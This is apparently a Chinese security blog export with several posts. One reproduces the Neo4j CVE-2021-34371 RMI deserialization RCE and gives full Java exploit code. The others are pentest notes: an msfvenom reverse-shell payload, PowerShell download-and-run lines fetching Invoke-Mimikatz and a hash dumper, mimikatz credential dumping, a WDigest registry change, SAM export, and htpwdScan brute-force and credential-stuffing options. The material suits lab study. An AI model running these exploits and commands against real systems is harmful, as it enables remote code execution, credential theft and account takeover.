<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/harry/.jdks/corretto-1.8.0_322//bin/java -cp /home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/lib/*:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins/*:/home/harry/.jdks/corretto-1.8.0_322//lib/tools.jar </span><br><span class="line">-server -XX:+UseG1GC -XX:-OmitStackTraceInFastThrow -XX:+AlwaysPreTouch -XX:+UnlockExperimentalVMOptions -XX:+TrustFinalNonStaticFields -XX:+DisableExplicitGC </span><br><span class="line">-Djdk.tls.ephemeralDHKeySize=2048 </span><br><span class="line">-Djdk.tls.rejectClientInitiatedRenegotiation=true </span><br><span class="line">-Dunsupported.dbms.udc.source=tarball </span><br><span class="line">-Dfile.encoding=UTF-8 org.neo4j.server.CommunityEntryPoint </span><br><span class="line">--home-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT </span><br><span class="line">--config-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</span><br></pre></td></tr></table></figure>



<p>因为要远程调试，所以启动命令加一条jvm配置<code>-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y</code></p>
<p>即启动命令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/harry/.jdks/corretto-1.8.0_322//bin/java </span><br><span class="line">-Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y</span><br><span class="line">-cp /home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/lib/*:/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/plugins/*:/home/harry/.jdks/corretto-1.8.0_322//lib/tools.jar </span><br><span class="line">-server -XX:+UseG1GC -XX:-OmitStackTraceInFastThrow -XX:+AlwaysPreTouch -XX:+UnlockExperimentalVMOptions -XX:+TrustFinalNonStaticFields -XX:+DisableExplicitGC </span><br><span class="line">-Djdk.tls.ephemeralDHKeySize=2048 </span><br><span class="line">-Djdk.tls.rejectClientInitiatedRenegotiation=true </span><br><span class="line">-Dunsupported.dbms.udc.source=tarball </span><br><span class="line">-Dfile.encoding=UTF-8 org.neo4j.server.CommunityEntryPoint </span><br><span class="line">--home-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT </span><br><span class="line">--config-dir=/home/harry/vlunReproduce/neo4j-3.4.18/packaging/standalone/target/neo4j-community-3.4.18-SNAPSHOT/conf</span><br></pre></td></tr></table></figure>

<p><strong>这里有个坑是zsh下我无法运行这条命令，换成bash就好了</strong></p>
<p>然后配置idea的远程调试本地端口，在idea中添加一个debug选项</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027089235-2022-4-2710:38:09.png"></p>
<p><code>use module classpath</code>选择community-build</p>
<h1 id="组装exp"><a href="#组装exp" class="headerlink" title="组装exp"></a>组装exp</h1><p>exp需要自己装一下，exploit-db里面写的很清楚（网址详见参考）</p>
<p>也可以直接用我这份组装好的</p>
<p><a href="https://anonfiles.com/3bhdtaa5ya/rhino_gadget_zip">https://anonfiles.com/3bhdtaa5ya/rhino_gadget_zip</a></p>
<p>这里贴下exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">////package runnable;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> org.neo4j.shell.ShellServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static String COMMAND = &quot;touch /tmp/test.txt&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String COMMAND = <span class="string">&quot;gnome-calculator&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TARGET = <span class="string">&quot;rmi://127.0.0.1:1337&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String TARGET_BINDING = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> validBinding = checkBinding(TARGET_BINDING, TARGET);</span><br><span class="line">        <span class="keyword">if</span> (!validBinding)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[-] No valid binding found, shell server may not be listening. Exiting&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Found valid binding, proceeding to exploit&quot;</span>);</span><br><span class="line">        ShellServer server = (ShellServer) Naming.lookup(TARGET + <span class="string">&quot;/&quot;</span> + TARGET_BINDING);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object payload = new RhinoGadget().getObject(COMMAND);</span></span><br><span class="line">        Object payload = Payload.getObject(COMMAND);  <span class="comment">// .getObject(COMMAND);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Here server.shutdown may also be callable without auth, just in case the exploit fails and you just want to turn the thing off</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.setSessionVariable(newClientId(), <span class="string">&quot;anything_here&quot;</span>, payload);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception UnmarshalException ) &#123;</span><br><span class="line"><span class="comment">//            UnmarshalException.printStackTrace();</span></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Caught an unmarshalled exception, this is expected.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Exploit completed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Just a helper method to validate that the rmi binding we&#x27;re looking for is present</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bindingToCheck the binding you&#x27;d like to check for</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetToCheck the rmi registry to check against</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true if the binding is present, false if not</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkBinding</span><span class="params">(String bindingToCheck, String targetToCheck)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Trying to enumerate server bindings: &quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            RegistryImpl_Stub stub = (RegistryImpl_Stub) Naming.lookup(targetToCheck);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (String element : stub.list()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Found binding: &quot;</span> + element);</span><br><span class="line">                <span class="keyword">if</span> (element.equalsIgnoreCase(bindingToCheck))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Serializable <span class="title">newClientId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.valueOf(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>启动neo4j然后运行exp</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027154337-2022-4-2710:39:15.png"></p>
<h2 id="调试定位漏洞原因"><a href="#调试定位漏洞原因" class="headerlink" title="调试定位漏洞原因"></a>调试定位漏洞原因</h2><p>调试了半天没断进去，</p>
<p>看了nvd对cve的描述是</p>
<blockquote>
<p>Neo4j through 3.4.18 (with the shell server enabled) exposes an RMI  service that arbitrarily deserializes Java objects, e.g., through  setSessionVariable. An attacker can abuse this for remote code execution because there are dependencies with exploitable gadget chains.</p>
</blockquote>
<p>同时能成功rce的exp在调用的远程方法也是<code> server.setSessionVariable(newClientId(), &quot;anything_here&quot;, payload);</code></p>
<p>对这这个函数签名找了一下对应的源码，</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027194321-2022-4-2710:39:55.png"></p>
<p>然后在调用点都下了断点，但是打exp的时候并没有断进去</p>
<p>然后学到了一个姿势，<strong>直接把断点下在jdk命令命令执行的内部方法上 ，然后去跟踪堆栈信息</strong></p>
<p>直接打在ProcessBuilder的start方法上</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027234860-2022-4-2710:40:35.png"></p>
<p>断进来了</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/1651027259854-2022-4-2710:41:00.png"></p>
<p>但是栈底一就是jdk内部的调用，没有断到neo4j的源码点上</p>
<p>然后跟了一下启动的流程吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启动导致漏洞的neo4j-shell 开启了rmi</span><br><span class="line">load:81, ShellBootstrap (org.neo4j.shell.impl)</span><br><span class="line">start:47, ShellServerKernelExtension (org.neo4j.shell.impl)</span><br><span class="line"># 以下为启动基础neo4j</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:84, KernelExtensions (org.neo4j.kernel.extension)</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">initFacade:208, GraphDatabaseFacadeFactory (org.neo4j.kernel.impl.factory)</span><br><span class="line">newFacade:125, GraphDatabaseFacadeFactory (org.neo4j.kernel.impl.factory)</span><br><span class="line">lambda$static$0:58, CommunityNeoServer (org.neo4j.server)</span><br><span class="line">newGraphDatabase:-1, 85777802 (org.neo4j.server.CommunityNeoServer$$Lambda$107)</span><br><span class="line">start:88, LifecycleManagingDatabase (org.neo4j.server.database)</span><br><span class="line">start:445, LifeSupport$LifecycleInstance (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:107, LifeSupport (org.neo4j.kernel.lifecycle)</span><br><span class="line">start:212, AbstractNeoServer (org.neo4j.server)</span><br><span class="line">start:111, ServerBootstrapper (org.neo4j.server)</span><br><span class="line">start:79, ServerBootstrapper (org.neo4j.server)</span><br><span class="line">main:32, CommunityEntryPoint (org.neo4j.server)</span><br></pre></td></tr></table></figure>



<p>依旧不清楚的是为什么没有断在那个<code> setSessionVariable</code>的方法中</p>
<p>但根据payload看造成漏洞的代码就是这个函数通过rmi载入了恶意了对象。</p>
<p>然后根据rmi自动反序列化导致了rce</p>
<p>然后新版本的修复是直接把这个类给删了，diff中看不到直接的修复</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34371">https://nvd.nist.gov/vuln/detail/CVE-2021-34371</a></li>
<li><a href="https://www.exploit-db.com/exploits/50170">https://www.exploit-db.com/exploits/50170</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试工具整理</title>
    <url>/2021/11/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="metaspolit"><a href="#metaspolit" class="headerlink" title="metaspolit"></a>metaspolit</h2><p>默认使用<code>msfconsole</code>进入这个交互式命令行工具，</p>
<p>然后主要是有几种模式</p>
<ol>
<li><p>直接利用payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索漏洞payload</span><br><span class="line">msf6 &gt; search [key_word]</span><br><span class="line"># 选中payload</span><br><span class="line">msf6 &gt; use [上一步搜出来的payload name]</span><br><span class="line"># 设置payload参数,key忽略大小写</span><br><span class="line">msf6 &gt; set key value</span><br><span class="line">#　显示payload参数</span><br><span class="line">msf6 &gt; options</span><br><span class="line"># 运行payload</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>

<p>注意这个依旧是msfconsole模式就是交互式命令行模式</p>
</li>
<li><p>利用指定的payload监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt;　use exploit/multi/handler        # 加载模块</span><br><span class="line">msf6 &gt; set [payload_name]   # 设置名字</span><br><span class="line">msf6 &gt; set [options_key]  [options_value]   # 设置该payload的options键值</span><br><span class="line"># 开始监听</span><br><span class="line">msf6 &gt; run</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>上面两个如果run完成了之后执行<code>shell</code>命令就进入了meterperter即已经进入了系统内部shell环境，所以个人理解这个meterperter是准备持久化</strong></p>
<ol start="3">
<li><p>使用msf生成后门</p>
<p>这是另一个模块<strong>msfvenom</strong>的内容</p>
<p>example:</p>
<ul>
<li>生成二进制文件</li>
</ul>
</li>
</ol>
<p>​        <code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.100.103 LPORT=4444 -f raw &gt; beacon.bin</code></p>
<ul>
<li>生成其他类型只需要改-f的属性就行</li>
</ul>
<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a><a href="https://github.com/wpscanteam/wpscan">wpscan</a></h2><blockquote>
<p>此工具主要用来扫描worldpress这个博客框架，这个应该更加靠近web渗透那一侧，就先放在这里做工具整理</p>
<p>world press scan</p>
</blockquote>
<p>它使用R的包管理构建，或者使用docker，kali自带。</p>
<p>我的系统是ubuntu所以采用了前者构建，详见之前打这个靶场的时候<a href="https://lycshub.github.io/2021/11/23/vulnhub-DC-2/">记录</a></p>
<p>参数和用法很简单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">＃使用默认配置扫网站</span><br><span class="line">wpscan --url　[目标网站]</span><br><span class="line"># 使用--stealthy可以静默扫描防止网站发现</span><br><span class="line">--enumertate可以爆破用户名使用它的时候加上--plugins-detection检测插件选项，默认是不检查</span><br><span class="line">-u 是枚举用户名</span><br></pre></td></tr></table></figure>



<h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><p>这是一个字典生成器<code>-h</code>可以看到所有的选项</p>
<p>记录下常用选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#默认方法直接吧生成的字典</span><br><span class="line">cewl url</span><br><span class="line"># -w生成到指定文件</span><br><span class="line">cewl url -w dict.txt</span><br><span class="line"># 计算重复的单词次数</span><br><span class="line">cewl url -c</span><br><span class="line"># -d 爬取深度3层</span><br><span class="line">cewl url -d 3</span><br><span class="line"># -e获取email信息</span><br><span class="line"># --with-numbers包括数字和字符</span><br></pre></td></tr></table></figure>



<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h2><blockquote>
<p>这个工具是我新接触的，记录一下使用的姿势</p>
<p>主要就是一个后渗透的工具，针对拿到了shell但是没有更高的权限时</p>
<p>针对windows系统</p>
<p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从  lsass.exe 进程中获取当前登录系统用户名的密码，  lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在  lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz  正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p>
<p>注：但是在安装了KB2871997补丁或者系统版本大于windows server  2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p>
</blockquote>
<h3 id="使用powershell获取密码"><a href="#使用powershell获取密码" class="headerlink" title="使用powershell获取密码"></a>使用powershell获取密码</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#读取密码明文(需要管理员权限)</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>); <span class="built_in">Invoke-Mimikatz</span> –DumpCerts</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#读取密码hash值(需要管理员权限)</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;</span>);<span class="built_in">Get-PassHashes</span></span><br></pre></td></tr></table></figure>



<h4 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h4><p>下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"><span class="comment">#抓取密码</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
<p>cmd修改注册表命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Copyreg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line"><span class="comment">#重启或用户重新登录后可以成功抓取</span></span><br></pre></td></tr></table></figure>

<h4 id="SAM表获取hash"><a href="#SAM表获取hash" class="headerlink" title="SAM表获取hash"></a>SAM表获取hash</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导出SAM数据</span></span><br><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用mimikatz提取hash</span></span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>



<p>还有和很多姿势，因为对windows很多安全机制不了解（比如域控中的成员hash,哈系传递攻击，票据传递攻击包括这个工具本身的免杀）先挖个坑，之后补全</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试流程</title>
    <url>/2021/11/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><p>整理一下渗透测试的流程，备忘，长期更新</p>
<span id="more"></span>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
<li><p>真实ip,网段，域名</p>
<p>whatweb</p>
</li>
<li><p>开放端口对应服务</p>
<p>nmap</p>
</li>
<li><p>子域名收集</p>
<p>oneforall</p>
</li>
<li><p>whois</p>
</li>
<li><p>旁站，c段</p>
<p>ladon</p>
</li>
<li><p>操作系统信息</p>
<p>wapplyzer,nmap</p>
</li>
<li><p>应用信息</p>
<p>wapplyzer</p>
<p>whatweb</p>
</li>
<li><p>网站后台</p>
<p>dirmap</p>
</li>
</ul>
<h3 id="漏洞探测＆利用"><a href="#漏洞探测＆利用" class="headerlink" title="漏洞探测＆利用"></a>漏洞探测＆利用</h3><ul>
<li>AWVS</li>
<li>vulmap</li>
<li>nessus</li>
<li>xray</li>
</ul>
<p>发现漏洞后进行利用：</p>
<h4 id="自动化验证：结合自动化扫描工具提供的结果。"><a href="#自动化验证：结合自动化扫描工具提供的结果。" class="headerlink" title="自动化验证：结合自动化扫描工具提供的结果。"></a>自动化验证：结合自动化扫描工具提供的结果。</h4><h4 id="试验验证：自己搭建模拟环境进行验证。"><a href="#试验验证：自己搭建模拟环境进行验证。" class="headerlink" title="试验验证：自己搭建模拟环境进行验证。"></a>试验验证：自己搭建模拟环境进行验证。</h4><h4 id="登陆猜解：爆破"><a href="#登陆猜解：爆破" class="headerlink" title="登陆猜解：爆破"></a>登陆猜解：爆破</h4><ul>
<li><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></li>
<li><a href="https://github.com/yzddmr6/WebCrack">https://github.com/yzddmr6/WebCrack</a></li>
</ul>
<h4 id="业务漏洞验证：如发现业务漏洞，要进行验证。"><a href="#业务漏洞验证：如发现业务漏洞，要进行验证。" class="headerlink" title="业务漏洞验证：如发现业务漏洞，要进行验证。"></a>业务漏洞验证：如发现业务漏洞，要进行验证。</h4><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>内网流量代理：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p>ladon　<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
<p>三大测试框架：</p>
<p>Metasploit、Empire、Cobalt Strike</p>
<p><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></p>
<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><ul>
<li><p>windows权限维持</p>
<p>隐藏，后门</p>
</li>
<li><p>linux权限维持</p>
<p>隐藏，后门</p>
</li>
</ul>
<p><a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E4%B8%89%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF.html">权限维持</a></p>
<p>MSF权限维持</p>
<p>Empire权限维持</p>
<p>Cobalt Strike权限维持</p>
<h3 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a>清理痕迹</h3>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>爆破后台-htpwdScan</title>
    <url>/2021/11/17/%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0-htpwdScan/</url>
    <content><![CDATA[<h2 id="htpwdScan"><a href="#htpwdScan" class="headerlink" title="htpwdScan"></a><a href="https://github.com/lijiejie/htpwdScan">htpwdScan</a></h2><p>这个工具有一点小坑，记录一下备忘</p>
<span id="more"></span>

<p>优势在于可以方便的使用对参数做二次处理，可以自己编写一个函数来进行插入操作</p>
<p>经过测试发现这个hashpassword参数只是一个base64编码后的字符串</p>
<p>利用这个脚本来完成</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/image-20211117114656854-2021-11-1712:07:27.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637121965955-2021-11-1712:06:05.png"></p>
<p>然后按照他的路径修改一下把密码字典传入的字符串先做一个base64编码</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637122132952-2021-11-1712:08:52.png"></p>
<p>但是使用命令行的时候直接报错，这里记录一下，最后的解决方案是直接找到他的运行类，模拟命令行参数输入的方式进行运行</p>
<p>直接运行这个py就可以，填入自己需要的参数</p>
<p><code>request.txt</code>是burp抓下来的请求体</p>
<p>-d 是字典，然后后面是参数＝字典</p>
<p>–fail是响应体出现的内容表示错误</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637122264381-2021-11-1712:11:04.png"></p>
<p>官网详细的参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: htpwdScan.py [options]</span><br><span class="line"></span><br><span class="line">* HTTP weak pass scanner. By LiJieJie *</span><br><span class="line"></span><br><span class="line">Target:</span><br><span class="line">  -u RequestURL         指定破解的URL</span><br><span class="line">                        -u &quot;https://www.test.com/login.php&quot;</span><br><span class="line">  -f RequestFile        从文本文件中，导入HTTP请求</span><br><span class="line">  --https               当从文件导入HTTP请求时，强制使用HTTPS</span><br><span class="line">  --get                 强制使用HTTP GET，默认POST</span><br><span class="line">  --auth  [ ...]        Basic/Digest/NTLM 暴力破解,</span><br><span class="line">                        e.g. --auth users.txt pass.txt</span><br><span class="line">                        e.g. --auth users.txt my_own_func(pass.txt)</span><br><span class="line">  --pass-first          固定密码优先爆破,减小账号被锁定几率</span><br><span class="line"></span><br><span class="line">Dictionary:</span><br><span class="line">  -d Param=DictFile [Param=DictFile ...]</span><br><span class="line">                        为参数设置字典文件, 支持二次处理参数值</span><br><span class="line">                        e.g. -d user=users.dic pass=md5(pass.dic)</span><br><span class="line">                        高级用户可自写python函数处理参数，lib/value_process.py</span><br><span class="line">                        e.g. -d user=users.dic pass=capitalize(pass.dic)</span><br><span class="line"></span><br><span class="line">Detect:</span><br><span class="line">  --no302               302跳转不敏感, 默认敏感，视为破解成功标记</span><br><span class="line">  --fail Fail [Fail ...]</span><br><span class="line">                        破解失败时的正文标记,可以是多个</span><br><span class="line">                        e.g. --fail &quot;user not exist&quot; &quot;password wrong&quot;</span><br><span class="line">  --suc Suc [Suc ...]   破解成功时的正文标记,可以是多个</span><br><span class="line">                        e.g. --suc &quot;welcome,&quot; &quot;logout&quot;</span><br><span class="line">  --header-fail HeaderFail</span><br><span class="line">                        位于HTTP头中的破解失败标记</span><br><span class="line">  --header-success HeaderSuccess</span><br><span class="line">                        位于HTTP头中的破解成功标记</span><br><span class="line">  --retry-txt RetryText</span><br><span class="line">                        当该文本出现时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-txt=&quot;IP blocked&quot;</span><br><span class="line">  --retry-no-txt RetryNoText</span><br><span class="line">                        当该文本没有出现时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-no-txt=&quot;&lt;body&gt;&quot;</span><br><span class="line">  --retry-header RetryHeader</span><br><span class="line">                        当该文本出现在HTTP头时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-header=&quot;Set-Cookie:&quot;</span><br><span class="line">  --retry-no-header RetryNoHeader</span><br><span class="line">                        当该文本没有出现在HTTP头时，视为当前请求无效，会再次重试</span><br><span class="line">                        e.g. --retry-no-header=&quot;HTTP/1.1 200 OK&quot;</span><br><span class="line"></span><br><span class="line">Proxy and Spoof:</span><br><span class="line">  --proxy Proxy         命令行设定若干代理服务器</span><br><span class="line">                        e.g. --proxy=1.2.3.4:8000, 5.6.7.8:8000</span><br><span class="line">  --proxy-file ProxyFile</span><br><span class="line">                        通过文件导入若干代理服务器</span><br><span class="line">                        e.g. --proxy-file=proxies.txt</span><br><span class="line">  --check-proxy         校验HTTP代理服务器是否工作正常</span><br><span class="line">  --fake-ip             伪造HTTP头 X-Forwarded-For，尝试伪造源IP</span><br><span class="line">  --fake-sid FakeSID    伪造session ID</span><br><span class="line">  --sleep Seconds       请求完成后延时N秒，减小被服务器封禁IP的几率</span><br><span class="line"></span><br><span class="line">Database attack:</span><br><span class="line">  --database param1,parma2=file</span><br><span class="line">                        导入社工库进行撞库测试</span><br><span class="line">                        e.g. --database user,pass=csdn.txt</span><br><span class="line">  --regex REGEX         按行正则提取参数值. e.g. --regex=&quot;(\S+)\s+(\S+)&quot;</span><br><span class="line"></span><br><span class="line">General:</span><br><span class="line">  -t Threads            并发工作线程，默认50</span><br><span class="line">  --allow-redirect      允许Follow 30x调整，默认禁止</span><br><span 